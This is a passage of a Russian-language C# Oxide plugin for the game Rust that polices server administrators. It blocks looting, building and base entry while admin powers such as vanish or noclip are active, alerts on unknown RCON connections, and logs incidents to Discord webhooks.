using System;
using System.Collections.Generic;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using UnityEngine.Assertions.Must;
using System.Linq;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using System.Globalization;
using System.Text.RegularExpressions;
using UnityEngine;
using System.Net;

namespace Oxide.Plugins
{
    [Info("AAASystem", "PRESSF", "4.0.6")]
    public class AAASystem : RustPlugin
    {
        #region Configuration

        private static ConfigData _config;

        public class ConfigData
        {
            public PermissionsConfig Права { get; set; } = new PermissionsConfig();
            public TogglesConfig Функции { get; set; } = new TogglesConfig();
            public OtherConfig Другое { get; set; } = new OtherConfig();
            public IntegrationsConfig Интеграции { get; set; } = new IntegrationsConfig();
            public MenuConfig Меню { get; set; } = new MenuConfig();
        }

        public class PermissionsConfig
        {
            [JsonProperty("Пермишен на использование GodMode")]
            public string GodMode { get; set; } = "aaasystem.godmode.use";

            [JsonProperty("Пермишен на использование NoClip")]
            public string NoClip { get; set; } = "aaasystem.noclip.use";

            [JsonProperty("Пермишен на использование Админ Телепорта (/astp и /back)")]
            public string AdminTP { get; set; } = "aaasystem.teleport.use";

            [JsonProperty("Пермишен на Админ Телепорт в дом (можно будет тепнуться к игроку если рядом шкаф)")]
            public string AdminTPrest { get; set; } = "aaasystem.teleportrest.use";

            [JsonProperty("Админы с игнорированием (765000000000000, 76500000000000001)")]
            public List<ulong> listignorplayers { get; set; } = new List<ulong> { };

            [JsonProperty("Адреса с которых можно подключатся к RCON (192.0.0.01, 192.0.0.02)")]
            public List<string> listignorips { get; set; } = new List<string> { };
        }

        public class TogglesConfig
        {
            [JsonProperty("Блокировать подключение к RCON + оповещене?")]
            public bool isBlockRCON { get; set; } = true;

            [JsonProperty("Рестарт через 30 секунд после входа в RCON?")]
            public bool isChangeRCON { get; set; } = true;

            [JsonProperty("Включить сообщения в чат?")]
            public bool isSendMessage { get; set; } = true;
            
            [JsonProperty("Сообщение в чат при абузе")] 
            public string Msg { get; set; } = "<color=red>оффни админку</color>";

            [JsonProperty("Сообщение в чат со списанием при подозрительной активности")] 
            public string Msgminus { get; set; } = "<color=red>прекрати | списали у тебя с доната 1 рубль, чтоб не втыкал</color>";
            
            [JsonProperty("Режим блокировки (true - блокировать весь урон) (false - блокировать только урон по игрокам)")]
            public bool isBlockAllDamage { get; set; } = true;

            [JsonProperty("Блокировать урон?")]
            public bool isBlockDamage { get; set; } = true;

            [JsonProperty("Блокировать авторизации?")]
            public bool isBlockAuth { get; set; } = true;

            [JsonProperty("Блокировать билдинг?")]
            public bool isBlockBuild { get; set; } = true;

            [JsonProperty("Блокировать лутание?")]
            public bool isBlockLoot { get; set; } = true;

            [JsonProperty("Блокировать двери и ввод паролей?")]
            public bool isBlockDoor { get; set; } = true;

            [JsonProperty("Блокировать NoClip при входе в bulding block?")]
            public bool isBlockEnter { get; set; } = true;

            [JsonProperty("Блокировать консольные команды? (пример: изменение ConVars, выдачу через inventory.give)")]
            public bool isBlockConvars { get; set; } = true;
            
            [JsonProperty("Проверять AdminESP - 0 , AdminRadar - 1 , AdminESP и AdminRadar - 2")] public int isRadarESP { get; set; } = 1;
        }

        public class OtherConfig
        {
            [JsonProperty("Команды для блока")]
            public List<string> blockcommandlist { get; set; } = new List<string> { };

            [JsonProperty("Ссылка на вебхук для анти абуза")] public string Webhook { get; set; } = "";

            [JsonProperty("Ссылка на вебхук для подозрительной активности")]
            public string SusWebhook { get; set; } = "";

            [JsonProperty("Ссылка на вебхук для оповещения о попытке входа в RCON")]
            public string WebhookRCON { get; set; } = "";

            [JsonProperty("Ссылка на вебхук для логирования /astp и /back")]
            public string WebhookTP { get; set; } = "";
            
            [JsonProperty("Сколько секунд после выключения функций считать подозрительной активностью")]
            public float secondsa { get; set; } = 15f;
        }

        public class IntegrationsConfig
        {
            [JsonProperty("(IQReportSystem) Включить интеграцию? Снятие админ прав за неактив")]
            public bool isIQRS { get; set; } = false;

            [JsonProperty("(IQReportSystem) При компиляции отправлять в дискорд статистику?")]
            public bool isIQRSstats { get; set; } = false;

            [JsonProperty("(IQReportSystem) Сколько часов модератор должен быть неактивен для снятия?")]
            public float IQRSdays { get; set; } = 128;

            [JsonProperty("(IQReportSystem) Ссылка на вебхук?")]
            public string WebhookIQRS { get; set; } = "";

            [JsonProperty("(IQReportSystem) Команда для снятия? (%steamid% заменяеться на стим айди админа)")]
            public string IQRScommands { get; set; } = "staff remove %steamid% moderator";
            
            [JsonProperty("(gamestores) Включить штраф?")]
            public bool isShtraf { get; set; } = true;

            [JsonProperty("(gamestores) На сколько рублей штрафовать?")]
            public float shtrafcount { get; set; } = 1;

            [JsonProperty("(gamestores) shop.id")]
            public string shopid { get; set; } = "40000";

            [JsonProperty("(gamestores) secret.key")]
            public string secretkey { get; set; } = "33d4";
        }

        public class MenuConfig
        {
            [JsonProperty("(MENU) Ссылка на фон с текстом")] 
            public string MenuB { get; set; } = "https://cdn.discordapp.com/attachments/1156620187223728168/1184986190705864704/image.png";

            [JsonProperty("(MENU) ссылка на картинку 'YES'")] 
            public string MenuY { get; set; } = "https://cdn.discordapp.com/attachments/1156620187223728168/1184990271289708615/image.png";

            [JsonProperty("(MENU) ссылка на картинку 'NO'")] 
            public string MenuN { get; set; } = "https://cdn.discordapp.com/attachments/1156620187223728168/1184990242583875704/image.png";

            [JsonProperty("(MENU) AnchorMax для фона с текстом")] 
            public string MenuBAMax { get; set; } = "1 1";

            [JsonProperty("(MENU) AnchorMin для фона с текстом")] 
            public string MenuBAMin { get; set; } = "1 1";

            [JsonProperty("(MENU) OffsetMax для фона с текстом")] 
            public string MenuBOMax { get; set; } = "-10 -10";

            [JsonProperty("(MENU) OffsetMin для фона с текстом")] 
            public string MenuBOMin { get; set; } = "-350 -200";

            [JsonProperty("(MENU) OffsetMax для статуса функции (1)")] 
            public string MenuYNOMax1 { get; set; } = "95 125";

            [JsonProperty("(MENU) OffsetMin для статуса функции (1)")] 
            public string MenuYNOMin1 { get; set; } = "55 105";

            [JsonProperty("(MENU) OffsetMax для статуса функции (2)")] 
            public string MenuYNOMax2 { get; set; } = "95 102.5";

            [JsonProperty("(MENU) OffsetMin для статуса функции (2)")] 
            public string MenuYNOMin2 { get; set; } = "55 82.5";

            [JsonProperty("(MENU) OffsetMax для статуса функции (3)")] 
            public string MenuYNOMax3 { get; set; } = "95 80";

            [JsonProperty("(MENU) OffsetMin для статуса функции (3)")] 
            public string MenuYNOMin3 { get; set; } = "55 60";

            [JsonProperty("(MENU) OffsetMax для статуса функции (4)")] 
            public string MenuYNOMax4 { get; set; } = "95 57.5";

            [JsonProperty("(MENU) OffsetMin для статуса функции (4)")] 
            public string MenuYNOMin4 { get; set; } = "55 37.5";
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                _config = Config.ReadObject<ConfigData>();
                if (_config == null) LoadDefaultConfig();
            }
            catch
            {
                Puts("ОШИБКА КОНФИГУРАЦИИ, ЗАГРУЗКА КОНФИГУРАЦИИ ПО УМОЛЧАНИЮ");
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig() => _config = new ConfigData();
        protected override void SaveConfig() => Config.WriteObject(_config, true);

        #endregion

        object OnRconConnection(IPAddress ip)
        {
            if (!_config.Функции.isBlockRCON)
                return null;

            string serverIp = ConVar.Server.ip;
            if (ip == IPAddress.Parse(serverIp))
                return null;
                
            Interface.Oxide.LogWarning("!!!!!НЕИЗВЕСТНЫЙ ПОДКЛЮЧАЕТСЯ К RCON!!!!!");
            Interface.Oxide.LogWarning("!!!!НЕИЗВЕСТНЫЙ ПОДКЛЮЧАЕТСЯ К RCON!!!!");
            Interface.Oxide.LogWarning("!!!НЕИЗВЕСТНЫЙ ПОДКЛЮЧАЕТСЯ К RCON!!!");
            Interface.Oxide.LogWarning("!!НЕИЗВЕСТНЫЙ ПОДКЛЮЧАЕТСЯ К RCON!!");
            Interface.Oxide.LogWarning("!НЕИЗВЕСТНЫЙ ПОДКЛЮЧАЕТСЯ К RCON!");
            Puts($"{ip} и айпи сервера {serverIp}");
                    
            if (_config.Функции.isChangeRCON)
                rust.RunServerCommand("restart 30");

            RequestDCVZLOM(jsonrconhack.Replace("[ip]", ip.ToString()).Replace("[stop]", _config.Функции.isChangeRCON ? "Сервер отправлен на рестарт!" : "Плагин ничего не предпринял!"));

            return true;
        }

        #region IQRS

        void OnStartedChecked(BasePlayer Target, BasePlayer Moderator, Boolean IsConsole = false)
        {
            if (!_config.Интеграции.isIQRS)
                return;
            if (IsConsole == false)
            {
                var data = Interface.Oxide.DataFileSystem.GetFile("AAAS_lastchecks");
                var playerData = new Dictionary<string, object>
                {
                    ["lastcheck"] = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"),
                };
                data["admins", Moderator.userID.ToString()] = playerData;
                data.Save();
            }
        }

        object OnServerCommand(ConsoleSystem.Arg arg)
        {
            if (_config.Функции.isBlockConvars)
            {
                string command = arg.cmd.FullName.ToLower();
                if (!command.Contains("AntiHack"))
                {
                    ulong commandHash;
                    if (ulong.TryParse(command, out commandHash) && _config.Другое.blockcommandlist.Contains(commandHash.ToString()))
                    {
                        Debug.LogError("Команда запрещена и не будет выполнена, динаху");
                        return true;
                    }
                }
            }
            return null;
        }

        #endregion

        #region Menu
        
        private string _ASlayer1 = "ASMenu";
        private string _ASlayer2 = "ASStat";

        void CloseMenuOETD(BasePlayer attaker)
        {
            CuiHelper.DestroyUi(attaker, _ASlayer1);
            //
        }

        void CloseMenu(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, _ASlayer1);
        }

        void OpenAAASMenu(BasePlayer attaker, bool isvanish, bool isadminesp, bool isfly, bool isGodMode, bool isNoClip, bool isRadar)
        {
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = {Color = "0 0 0 0"},
                RectTransform = { AnchorMin = _config.Меню.MenuBAMin,AnchorMax = _config.Меню.MenuBAMax,OffsetMin = _config.Меню.MenuBOMin,OffsetMax = _config.Меню.MenuBOMax}
            }, "Overlay", _ASlayer1);

            container.Add(new CuiElement
            {
                Parent = _ASlayer1,
                Components =
                {
                    new CuiRawImageComponent
                    {
                        Png = (string) ImageLibrary.Call("GetImage","menubt")
                    }
                }
            });

            container.Add(new CuiElement
            {
                Parent = _ASlayer1,
                Name = "YesorNo1",
                Components =
                {
                    new CuiRawImageComponent
                    {
                        Png = (string) ImageLibrary.Call("GetImage", isfly || isNoClip ? "yes" : "no")
                    },
                    new CuiRectTransformComponent{AnchorMin = "0.1 0.1",AnchorMax = "0.1 0.1",OffsetMin = _config.Меню.MenuYNOMin1,OffsetMax = _config.Меню.MenuYNOMax1}
                }
            });

            container.Add(new CuiElement
            {
                Parent = _ASlayer1,
                Name = "YesorNo2",
                Components =
                {
                    new CuiRawImageComponent
                    {
                        Png = (string) ImageLibrary.Call("GetImage", isGodMode ? "yes" : "no")
                    },
                    new CuiRectTransformComponent{AnchorMin = "0.1 0.1",AnchorMax = "0.1 0.1",OffsetMin = _config.Меню.MenuYNOMin2,OffsetMax = _config.Меню.MenuYNOMax2}
                }
            });

            container.Add(new CuiElement
            {
                Parent = _ASlayer1,
                Name = "YesorNo3",
                Components =
                {
                    new CuiRawImageComponent
                    {
                        Png = (string) ImageLibrary.Call("GetImage", isadminesp || isRadar ? "yes" : "no")
                    },
                    new CuiRectTransformComponent{AnchorMin = "0.1 0.1",AnchorMax = "0.1 0.1",OffsetMin = _config.Меню.MenuYNOMin3,OffsetMax = _config.Меню.MenuYNOMax3}

                }
            });

            container.Add(new CuiElement
            {
                Parent = _ASlayer1,
                Name = "YesorNo4",
                Components =
                {
                    new CuiRawImageComponent
                    {
                        Png = (string) ImageLibrary.Call("GetImage", isvanish ? "yes" : "no")
                    },
                    new CuiRectTransformComponent{AnchorMin = "0.1 0.1",AnchorMax = "0.1 0.1",OffsetMin = _config.Меню.MenuYNOMin4,OffsetMax = _config.Меню.MenuYNOMax4}
                }
            });

            CuiHelper.AddUi(attaker, container);

        }

        #endregion

        Dictionary<ulong, bool> playerRadars = new Dictionary<ulong, bool>();

        private void OnRadarActivated(BasePlayer player, string playerName, string playerId, Vector3 lastPosition)
        {
            ulong playerSteamID;

            if (ulong.TryParse(playerId, out playerSteamID))
            {
                if (!playerRadars.ContainsKey(playerSteamID))
                {
                    playerRadars.Add(playerSteamID, true);
                }

                playerRadars[playerSteamID] = true;
                player.ChatMessage($"Радар: <color=green>включен</color>");

                if (_config.Права.listignorplayers.Contains(player.userID)) return;
                if (RecentFunctions.ContainsKey(player.userID))
                {
                    if (RecentFunctions[player.userID] == "AdminESP")
                    {
                        RequestDS(jsonsusrepeek.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "AdminESP"), true);
                        RecentFunctions.Remove(player.userID);
                        return;
                    }
                    else
                    {
                        RecentFunctions.Add(player.userID, "AdminESP");
                    }
                }
                else
                {
                    RecentFunctions.Add(player.userID, "AdminESP");
                }
            }
        }

        private void OnRadarDeactivated(BasePlayer player, string playerName, string playerId, Vector3 lastPosition)
        {
            ulong playerSteamID;

            if (ulong.TryParse(playerId, out playerSteamID))
            {
                if (!playerRadars.ContainsKey(playerSteamID))
                {
                    playerRadars.Add(playerSteamID, false);
                }

                playerRadars[playerSteamID] = false;
                player.ChatMessage($"Радар: <color=red>выключен</color>");

                if (_config.Права.listignorplayers.Contains(player.userID)) return;
                if (RecentFunctions.ContainsKey(player.userID))
                {
                    if (RecentFunctions[player.userID] == "AdminESP")
                    {
                        RequestDS(jsonsusrepeek.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "AdminESP"), true);
                        RecentFunctions.Remove(player.userID);
                        return;
                    }
                    else
                    {
                        RecentFunctions.Add(player.userID, "AdminESP");
                    }
                }
                else
                {
                    RecentFunctions.Add(player.userID, "AdminESP");
                }
                timer.Once(_config.Другое.secondsa, () =>
                {
                    RecentFunctions.Remove(player.userID);
                });
            }
        }

        Dictionary<ulong, bool> playerNoClipes = new Dictionary<ulong, bool>();
        
        Timer checktimer;

        [ChatCommand("noclip")]
        private void NoCLipCommand(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, _config.Права.NoClip))
            {
                player.ChatMessage("У вас нет прав для использования этой команды.");
                return;
            }

            ulong playerSteamID = player.userID;

            if (!playerNoClipes.ContainsKey(playerSteamID))
            {
                playerNoClipes.Add(playerSteamID, false);
            }

            playerNoClipes[playerSteamID] = !playerNoClipes[playerSteamID];

            string NoClipStatus = playerNoClipes[playerSteamID] ? "<color=green>включен</color>" : "<color=red>выключен</color>";
            player.ChatMessage($"Режим летчика: {NoClipStatus}");

            if (playerNoClipes[playerSteamID])
            {
                player.SetPlayerFlag(BasePlayer.PlayerFlags.IsDeveloper, true);
                timer.Once(0.5f, () => {
                    player.SendConsoleCommand("noclip");
                });
                string Grid = GetGridString(player.transform.position);
                if (_config.Функции.isBlockEnter)
                {
                    checktimer = timer.Every(0.2f, () => {
                        if (!player.CanBuild())
                        {
                            player.SendConsoleCommand("noclip");
                            timer.Once(0.5f, () => {
                                player.SetPlayerFlag(BasePlayer.PlayerFlags.IsDeveloper, false);
                            });
                            playerNoClipes[playerSteamID] = !playerNoClipes[playerSteamID];
                            player.ChatMessage("<color=red>Администратор! нельзя в чужие дома залетать! оповестили твое руководство</color>");

                            RequestDS(jsonsusnoclip.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "NoClip").Replace("[grid]", "на координате " + Grid), true);

                            if (checktimer != null && checktimer.Destroyed == false)
                            {
                                checktimer.Destroy();
                            }
                        }
                    });
                }
            }
            else
            {
                player.SendConsoleCommand("noclip");
                if (checktimer != null && checktimer.Destroyed == false)
                {
                    checktimer.Destroy();
                }
                timer.Once(0.5f, () => {
                    player.SetPlayerFlag(BasePlayer.PlayerFlags.IsDeveloper, false);
                });
            }
            if (_config.Права.listignorplayers.Contains(player.userID)) return;
            if (RecentFunctions.ContainsKey(player.userID))
            {
                if (RecentFunctions[player.userID] == "NoClip")
                {
                    RequestDS(jsonsusrepeek.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "NoClip"), true);
                    RecentFunctions.Remove(player.userID);
                    return;
                }
                else 
                {
                    RecentFunctions.Add(player.userID, "NoClip");
                }
            }
            else 
            {
                RecentFunctions.Add(player.userID, "NoClip");
            }
            timer.Once(_config.Другое.secondsa, () =>
            {
                RecentFunctions.Remove(player.userID);
            });
        }

        private Dictionary<ulong, Vector3> playerPosDB = new Dictionary<ulong, Vector3>();

        [ChatCommand("back")]
        private void AdminBackTPCommand(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, _config.Права.AdminTP))
            {
                player.ChatMessage("У вас нет прав для использования этой команды.");
                return;
            }

            ulong playerId = player.userID;

            if (playerPosDB.ContainsKey(playerId))
            {
                Vector3 targetPosition = playerPosDB[playerId];
                player.Teleport(targetPosition);
                player.ChatMessage("</color=green>Телепорт на обратную точку.</color>");
                string Grid = GetGridString(targetPosition);
                RequestLog(jsonteleportlog.Replace("[player]", player.displayName+" | "+ player.userID)
                    .Replace("[command]", "/back").Replace("[grid]", "на координате " + Grid));
                playerPosDB.Remove(playerId);

            }
            else
            {
                player.ChatMessage("</color=red>Точка обратного телепорта не найдена.</color>");
            }
        }

        [ChatCommand("astp")]
        private void AdminTPCommand(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, _config.Права.AdminTP))
            {
                player.ChatMessage("У вас нет прав для использования этой команды.");
                return;
            }

            ulong playerId = player.userID; 

            if (args.Length < 1)
            {
                player.ChatMessage("Используйте: /astp \"НикНейм\"");
                return;
            }

            string displayName = args[0];
            BasePlayer targetPlayer = FindPlayerByDisplayNameT(displayName);
            if (targetPlayer == null)
            {
                player.ChatMessage("Игрок не найден.");
                return;
            }

            if (!permission.UserHasPermission(player.UserIDString, _config.Права.AdminTPrest))
            {
                string nearbyObjects = GetNearbyObjects(targetPlayer.transform.position, 10f);
                if (HasForbiddenObjects(nearbyObjects) || !targetPlayer.CanBuild())
                {
                    Vector3 alternativePoint = FindAlternativeTeleportPoint(targetPlayer.transform.position, 25f);

                    if (alternativePoint != Vector3.zero)
                    {
                        player.ChatMessage($"<color=red>Игрок находится в зоне чужого шкафа.</color> \nТелепорт в альтернативное место в радиусе 25м \n<color=yellow>Для телепорта назад используйте</color> /back");
                        playerPosDB[playerId] = player.transform.position;
                        player.Teleport(alternativePoint);
                        string Grid = GetGridString(alternativePoint);
                        RequestLog(jsonteleportlog.Replace("[player]", player.displayName+" | "+ player.userID)
                            .Replace("[command]", "/astp").Replace("[grid]", "на координате " + Grid));
                    }
                    else
                    {
                        player.ChatMessage("<color=red>Не удалось найти альтернативное место для телепорта.</color> Попробуйте позже.");
                    }
                    return;
                }
                else
                {
                    player.ChatMessage($"<color=green>Телепорт к</color> \"{targetPlayer.displayName}\" \n<color=yellow>Для телепорта назад используйте</color> /back");
                    playerPosDB[playerId] = player.transform.position;
                    player.Teleport(targetPlayer.transform.position);
                    string Grid = GetGridString(targetPlayer.transform.position);
                    RequestLog(jsonteleportlog.Replace("[player]", player.displayName+" | "+ player.userID)
                        .Replace("[command]", "/astp").Replace("[grid]", "на координате " + Grid));
                }
            }
            else
            {
                player.ChatMessage($"<color=green>Телепорт к</color> \"{targetPlayer.displayName}\" \n<color=yellow>Для телепорта назад используйте</color> /back");
                playerPosDB[playerId] = player.transform.position;
                player.Teleport(targetPlayer.transform.position);
                string Grid = GetGridString(targetPlayer.transform.position);
                RequestLog(jsonteleportlog.Replace("[player]", player.displayName+" | "+ player.userID)
                    .Replace("[command]", "/astp").Replace("[grid]", "на координате " + Grid));
            }

            Vector3 FindAlternativeTeleportPoint(Vector3 startPosition, float searchRadius)
            {
                int maxAttempts = 10;
                
                for (int i = 0; i < maxAttempts; i++)
                {
                    Vector3 randomOffset = UnityEngine.Random.onUnitSphere * UnityEngine.Random.Range(1f, searchRadius);
                    Vector3 alternativePoint = startPosition + randomOffset;

                    string nearbyObjects = GetNearbyObjects(alternativePoint, 10f);

                    if (!HasForbiddenObjects(nearbyObjects))
                    {
                        return alternativePoint;
                    }
                }

                return Vector3.zero;
            }
        }

        private BasePlayer FindPlayerByDisplayNameT(string displayName)
        {
            BasePlayer targetPlayer = null;

            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                if (player.displayName.ToLower().Contains(displayName.ToLower()))
                {
                    targetPlayer = player;
                    break;
                }
            }

            return targetPlayer;
        }

        Dictionary<ulong, bool> playerGodModes = new Dictionary<ulong, bool>();

        [ChatCommand("god")]
        private void GodModeCommand(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, _config.Права.GodMode))
            {
                player.ChatMessage("У вас нет прав для использования этой команды.");
                return;
            }

            ulong playerSteamID = player.userID;

            if (!playerGodModes.ContainsKey(playerSteamID))
            {
                playerGodModes.Add(playerSteamID, false);
            }

            playerGodModes[playerSteamID] = !playerGodModes[playerSteamID];

            string godModeStatus = playerGodModes[playerSteamID] ? "<color=green>включен</color>" : "<color=red>выключен</color>";
            player.ChatMessage($"Режим бога: {godModeStatus}");

            if (_config.Права.listignorplayers.Contains(player.userID)) return;
            if (!playerGodModes[playerSteamID])
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return;
                if (RecentFunctions.ContainsKey(player.userID))
                {
                    if (RecentFunctions[player.userID] == "GodMode")
                    {
                        RequestDS(jsonsusrepeek.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "GodMode"), true);
                        RecentFunctions.Remove(player.userID);
                        return;
                    }
                    else 
                    {
                        RecentFunctions.Add(player.userID, "GodMode");
                    }
                }
                else 
                {
                    RecentFunctions.Add(player.userID, "GodMode");
                }
                timer.Once(_config.Другое.secondsa, () =>
                {
                    RecentFunctions.Remove(player.userID);
                });
            }
        }
        
        [PluginReference] private Plugin AdminRadar, Vanish, AdminESP, ImageLibrary, IQReportSystem;
        
        //Dictionary<string, int> cdDict = new Dictionary<string, int>();
        float resetInterval = 8f; 
        string sN = ConVar.Server.hostname; 

        void Unload()
        {
            if (this.Title == "AAASystem")
            {
                foreach (BasePlayer player in BasePlayer.activePlayerList)
                {
                    CloseMenu(player);
                }
            }
        }

        private void OnServerInitialized()
        {
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                CloseMenu(player);
            }

            //Puts("!!!В ЭТОМ ПЛАГИНЕ УСТАНОВЛЕННА СИСТЕМА ЗАЩИТЫ ОТ СЛИВА ИЗ ПОЛЬЗОВАТЕЛЬСКОГО СОГЛАШЕНИЯ!!!");
            //timer.Repeat(resetInterval, 0, () => ResetCD());
            permission.RegisterPermission(_config.Права.GodMode, this);
            permission.RegisterPermission(_config.Права.NoClip, this);
            permission.RegisterPermission(_config.Права.AdminTP, this);
            permission.RegisterPermission(_config.Права.AdminTPrest, this);
            //permission.RegisterPermission(_config.Права.AdminTP, this);
            permission.RegisterPermission("aaasystem.can.seemenu", this);
            ImageLibrary.Call("AddImage", _config.Меню.MenuB,"menubt");
            ImageLibrary.Call("AddImage", _config.Меню.MenuY,"yes");
            ImageLibrary.Call("AddImage", _config.Меню.MenuN,"no");

            var data = Interface.Oxide.DataFileSystem.GetFile("AAAS_lastchecks");
            var playerData = data["admins"] as Dictionary<string, object>;
            if (playerData != null && _config.Интеграции.isIQRS)
            {
                foreach (var entry in playerData)
                {
                    string playerId = entry.Key;
                    var playerInfo = entry.Value as Dictionary<string, object>;
                    if (playerInfo != null)
                    {
                        string dateString = playerInfo["lastcheck"].ToString();
                        DateTime lastCheck;
                        if (DateTime.TryParseExact(dateString, "dd/MM/yyyy HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.None, out lastCheck))
                        {
                            DateTime currentTime = DateTime.Now;
                            TimeSpan timeDifference = currentTime - lastCheck;
                            double hours = timeDifference.TotalHours;
                            if (hours >= _config.Интеграции.IQRSdays)
                            {
                                string formattedCommand = _config.Интеграции.IQRScommands.Replace("%steamid%", playerInfo["admins"].ToString());
                                rust.RunServerCommand(formattedCommand);
                                RequestDCINT(jsoniqreportsnt.Replace("[player]", playerInfo["admins"].ToString()));
                            }
                            else if (hours >= 12)
                            {
                                if (_config.Интеграции.isIQRSstats)
                                {
                                    RequestDCINT(jsoniqreport.Replace("[player]", playerInfo["admins"].ToString()).Replace("[day]", hours.ToString()));
                                }
                            }
                        }
                    }
                }
            }
        }

        /*void ResetCD()
        {
            foreach (var attakerID in cdDict.Keys.ToList())
            {
                cdDict[attakerID] = 0;
            }
        }*/
        
        void OnLootEntity(BasePlayer player, BaseEntity entity)
        {
            if (_config.Функции.isBlockLoot)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return;

                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                bool isadminesp = false;
                bool isRadar = false;
                if (_config.Функции.isRadarESP == 0)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                } else if (_config.Функции.isRadarESP == 1)
                {
                    if (playerRadars.ContainsKey(player.userID))
                    {
                        isRadar = playerRadars[player.userID];
                    }
                } else if (_config.Функции.isRadarESP == 2)
                {
                    isadminesp = AdminESP.Call<bool>("IsUsingEsp", player);
                    if (playerRadars.ContainsKey(player.userID))
                    {
                        isRadar = playerRadars[player.userID];
                    }
                }
                bool isfly = player.IsFlying;
                bool isGodMode = false;
                bool isNoClip = false;
                if (playerNoClipes.ContainsKey(player.userID))
                {
                    isNoClip = playerNoClipes[player.userID];
                }
                if (playerGodModes.ContainsKey(player.userID))
                {
                    isGodMode = playerGodModes[player.userID];
                }

                string Grid = GetGridString(player.transform.position);

                if (isvanish || isfly || isGodMode || isadminesp || isRadar || isNoClip)
                {
                    timer.Once(0.01f, () =>
                    {
                        player.EndLooting();
                    });

                    string nearbyObjects = GetNearbyObjects(player.transform.position, 10f);
                    string forbiddenObjectsResult = HasForbiddenObjects(nearbyObjects) && !player.CanBuild() ? "Рядом чужой шкаф." : "Рядом нет чужих шкафов.";

                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    RequestDS(jsonsuslootplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[plugins]",
                        (isvanish? "Vanish ":"" ) +
                        (isGodMode? "GodMode ":"" ) +
                        (isadminesp || isRadar? "AdminESP " : "") +
                        (isfly || isNoClip? "NoClip": "")
                        ).Replace("[buildblock]", forbiddenObjectsResult + " на координате " + Grid), true);
                }
                if (RecentFunctions.ContainsKey(player.userID))
                {
                    if (RecentFunctions[player.userID] == "Vanish")
                    {
                        RequestDS(jsonsuslootafter.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "Vanish").Replace("[grid]", "на координате " + Grid), true);
                    } 
                    if (RecentFunctions[player.userID] == "NoClip")
                    {
                        RequestDS(jsonsuslootafter.Replace("[player]", player.displayName + " | " + player.userID).Replace("[plugin]", "NoClip").Replace("[grid]", "на координате " + Grid), true);
                    }
                    timer.Once(0.01f, () =>
                    {
                        player.EndLooting();
                    });
                }
            }
        }

        object OnCupboardAuthorize(BuildingPrivlidge privilege, BasePlayer player, int players)
        {
            if (_config.Функции.isBlockAuth)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (!player.CanBuild())
                {
                    if (isvanish)
                    {
                        /*timer.Once(0.01f, () =>
                        {
                            privilege.authorizedPlayers.RemoveAt(players);
                        });*/
                        string Grid = GetGridString(player.transform.position);
                        RequestDS(jsonsusauthplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[grid]", "на координате " + Grid).Replace("[entity]", "Шкаф"), true);
                        player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                        return true;
                    }
                }
            }
            return null;
        }

        object OnTurretAuthorize(AutoTurret turret, BasePlayer player, int players)
        {
            if (_config.Функции.isBlockAuth)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (isvanish)
                {
                    /*timer.Once(0.01f, () =>
                    {
                        turret.authorizedPlayers.RemoveAt(players);
                    });*/
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusauthplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[grid]", "на координате " + Grid).Replace("[entity]", "Турель"), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    return true;
                }
            }
            return null;
        }

        object OnConstructionPlace(BaseEntity entity, Construction component, Construction.Target constructionTarget, BasePlayer player)
        {
            if (_config.Функции.isBlockBuild)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (isvanish)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusbuildplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[grid]", "на координате " + Grid).Replace("[method]", "строить " + entity), true);
                    player.ChatMessage("<color=red>Администратор! функции выключи! оповестили твое руководство</color>");
                    return true;
                }
            }
            return null;
        }

        object OnStructureUpgrade(BaseCombatEntity entity, BasePlayer player, BuildingGrade.Enum grade)
        {
            if (_config.Функции.isBlockBuild)
            {
                if (_config.Права.listignorplayers.Contains(player.userID)) return null;
                bool isvanish = Vanish.Call<bool>("IsInvisible", player);
                if (isvanish)
                {
                    string Grid = GetGridString(player.transform.position);
                    RequestDS(jsonsusbuildplayer.Replace("[player]", player.displayName+" | "+ player.userID).Replace("[grid]", "на координате " + Grid).Replace("[method]", "улучшать " + entity), true);
